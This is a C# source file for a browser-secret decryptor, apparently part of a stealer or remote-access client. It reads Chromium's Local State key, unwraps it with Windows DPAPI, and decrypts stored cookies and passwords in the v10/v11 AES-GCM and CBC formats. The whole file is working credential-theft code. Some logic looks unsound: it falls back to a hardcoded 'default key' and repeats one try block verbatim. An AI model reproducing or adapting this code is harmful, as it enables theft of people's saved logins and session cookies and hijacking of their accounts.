using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Pulsar.Client.Kematian.Browsers.Helpers.SQL;

namespace Pulsar.Client.Kematian.HelpingMethods.Decryption
{
    /// <summary>
    /// Provides methods to decrypt Chromium 127+ cookies and credentials.
    /// </summary>
    public class ChromiumV127Decryptor
    {
        private readonly byte[] _key;

        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            IntPtr ppszDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            uint dwFlags,
            ref DATA_BLOB pDataOut);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LocalFree(IntPtr hMem);

        private const uint CRYPTPROTECT_UI_FORBIDDEN = 0x01;
        private const uint CRYPTPROTECT_LOCAL_MACHINE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public uint cbData;
            public IntPtr pbData;
        }

        public ChromiumV127Decryptor(string localStatePath)
        {
            try
            {
                _key = DecryptChromeKey(localStatePath);
                
                if (_key == null || _key.Length == 0)
                {
                    _key = GetDefaultKey();
                }
            }
            catch (Exception)
            {
                _key = GetDefaultKey();
            }
        }

        // Default key used by Chromium as fallback
        private static byte[] GetDefaultKey()
        {
            return new byte[] {
                0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
                0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36
            };
        }

        private byte[] DpapiDecrypt(byte[] data, bool useMachineKey = false)
        {
            DATA_BLOB dataIn = new DATA_BLOB();
            DATA_BLOB dataOut = new DATA_BLOB();

            dataIn.cbData = (uint)data.Length;
            IntPtr pData = Marshal.AllocHGlobal(data.Length);
            Marshal.Copy(data, 0, pData, data.Length);
            dataIn.pbData = pData;

            try
            {
                // Set flags based on whether to use machine key
                uint flags = CRYPTPROTECT_UI_FORBIDDEN;
                if (useMachineKey)
                {
                    flags |= CRYPTPROTECT_LOCAL_MACHINE;
                }

                bool success = CryptUnprotectData(
                    ref dataIn,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    flags,
                    ref dataOut);

                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception();
                }

                byte[] decrypted = new byte[dataOut.cbData];
                Marshal.Copy(dataOut.pbData, decrypted, 0, (int)dataOut.cbData);
                return decrypted;
            }
            finally
            {
                Marshal.FreeHGlobal(pData);
                if (dataOut.pbData != IntPtr.Zero)
                {
                    LocalFree(dataOut.pbData);
                }
            }
        }

        // Extract encryption key from local state
        private string ExtractEncKeyLS(string localStateContent)
        {
            try
            {
                // Try to find ABE key
                string appBoundKey = ExtractValue(localStateContent, "app_bound_encrypted_key");
                if (!string.IsNullOrEmpty(appBoundKey))
                {
                    return appBoundKey;
                }

                // If ABE key isnt found then try encrypted key
                string encKey = ExtractValue(localStateContent, "encrypted_key");
                if (!string.IsNullOrEmpty(encKey))
                {
                    return encKey;
                }

                throw new Exception();
            }
            catch (Exception)
            {
                throw;
            }
        }

        private string ExtractValue(string json, string key)
        {
            string searchKey = $"\"{key}\":\"";
            int keyIndex = json.IndexOf(searchKey);
            if (keyIndex == -1)
                return null;

            int valueStartIndex = keyIndex + searchKey.Length;
            int valueEndIndex = json.IndexOf('"', valueStartIndex);
            if (valueEndIndex == -1)
                return null;

            return json.Substring(valueStartIndex, valueEndIndex - valueStartIndex);
        }

        private byte[] DecryptChromeKey(string localStatePath)
        {
            if (string.IsNullOrEmpty(localStatePath) || !File.Exists(localStatePath))
            {
                throw new Exception();
            }
            
            // Read local state
            string localStateJson = File.ReadAllText(localStatePath);
            
            // Extract encrypted key using string manipulation
            string encKeyText = ExtractEncKeyLS(localStateJson);
            if (string.IsNullOrEmpty(encKeyText))
            {
                throw new Exception();
            }

            byte[] decoded = Convert.FromBase64String(encKeyText);
            
            if (decoded.Length > 5 && Encoding.ASCII.GetString(decoded, 0, 4) == "APPB")
            {
                // Skip APPB prefix
                byte[] dataNoPref = new byte[decoded.Length - 5];
                Buffer.BlockCopy(decoded, 5, dataNoPref, 0, decoded.Length - 5);
                
                try
                {
                    return DpapiDecrypt(dataNoPref);
                }
                catch (Exception)
                {
                    return GetDefaultKey();
                }
            }
            else
            {
                return GetDefaultKey();
            }
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                if (string.IsNullOrEmpty(cipherText))
                    return "";

                byte[] encValue = Encoding.Default.GetBytes(cipherText);
                
                // Handle empty or small values
                if (encValue == null || encValue.Length < 3)
                {
                    return Encoding.UTF8.GetString(encValue ?? Array.Empty<byte>());
                }
                
                // Check Chrome 127+ format (v10/v11)
                if (encValue[0] == 'v' && encValue[1] == '1' && (encValue[2] == '0' || encValue[2] == '1'))
                {
                    try
                    {
                        // Extract IV
                        byte[] iv = new byte[12];
                        Buffer.BlockCopy(encValue, 3, iv, 0, 12);
                        
                        // Encrypted data excluding tag
                        int encDataLen = encValue.Length - 3 - 12 - 16;
                        byte[] encData = new byte[encDataLen];
                        Buffer.BlockCopy(encValue, 3 + 12, encData, 0, encDataLen);
                        
                        // Extract 16-byte GCM tag
                        byte[] tag = new byte[16];
                        Buffer.BlockCopy(encValue, encValue.Length - 16, tag, 0, 16);
                        
                        try
                        {
                            var aes = new AesGcmBetter();
                            byte[] decrypted = aes.Decrypt(_key, iv, null, encData, tag);
                            
                            // For v10 the actual value starts after a 32-byte prefix
                            if (encValue[2] == '0' && decrypted.Length > 32)
                            {
                                return Encoding.UTF8.GetString(decrypted, 32, decrypted.Length - 32);
                            }
                            
                            // For v11 use the entire decrypted value
                            return Encoding.UTF8.GetString(decrypted);
                        }
                        catch (Exception)
                        {

                        }
                    }
                    catch (Exception)
                    {

                    }
                }
                
                // If not a v10/v11 cookie or AES-GCM failed then try CBC decryption
                try
                {
                    if (encValue.Length > 16)
                    {
                        byte[] iv = new byte[16];
                        Buffer.BlockCopy(encValue, 0, iv, 0, 16);
                        
                        byte[] encData = new byte[encValue.Length - 16];
                        Buffer.BlockCopy(encValue, 16, encData, 0, encValue.Length - 16);
                        
                        using (Aes aes = Aes.Create())
                        {
                            aes.Key = _key;
                            aes.IV = iv;
                            aes.Mode = CipherMode.CBC;
                            aes.Padding = PaddingMode.PKCS7;
                            
                            using (ICryptoTransform decryptor = aes.CreateDecryptor())
                            {
                                byte[] decrypted = decryptor.TransformFinalBlock(encData, 0, encData.Length);

                                try
                                {
                                    string result = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
                                    if (result.Length > 0 && result.All(c => c >= 32 && c <= 126))
                                    {
                                        return result;
                                    }
                                }
                                catch
                                { 
                                    return "";
                                }
                                try
                                {
                                    string result = Encoding.UTF8.GetString(decrypted).TrimEnd('\0');
                                    if (result.Length > 0 && result.All(c => c >= 32 && c <= 126))
                                    {
                                        return result;
                                    }
                                }
                                catch
                                {

                                }
                            }
                        }
                    }
                }
                catch (Exception)
                {

                }
                
                try
                {
                    var initVector = encValue.Skip(3).Take(12).ToArray();
                    var encData = encValue.Skip(15).ToArray();

                    var actualencData = encData.Take(encData.Length - 16).ToArray();
                    var authTag = encData.Skip(encData.Length - 16).ToArray();

                    var decryptedPass = DecryptAesGcm(actualencData, _key, initVector, authTag);
                    if (decryptedPass != null && decryptedPass.Length > 0)
                    {
                        return Encoding.UTF8.GetString(decryptedPass);
                    }
                }
                catch (Exception)
                {

                }
                
                try
                {
                    string plainText = Encoding.UTF8.GetString(encValue);
                    if (plainText.All(c => c >= 32 && c <= 126))
                    {
                        return plainText;
                    }
                }
                catch
                {

                }
                
                return "";
            }
            catch (Exception)
            {
                return "";
            }
        }

        private byte[] DecryptAesGcm(byte[] encryptedPassword, byte[] key, byte[] nonce, byte[] authTag)
        {
            const int KEY_BIT_SIZE = 256;

            if (key?.Length != KEY_BIT_SIZE / 8)
            {
                return null;
            }

            if (encryptedPassword == null || encryptedPassword.Length == 0)
            {
                return null;
            }

            try
            {
                var AES = new AesGcmBetter();
                return AES.Decrypt(key, nonce, null, encryptedPassword, authTag);
            }
            catch (Exception)
            {
                return null;
            }
        }
    }
} 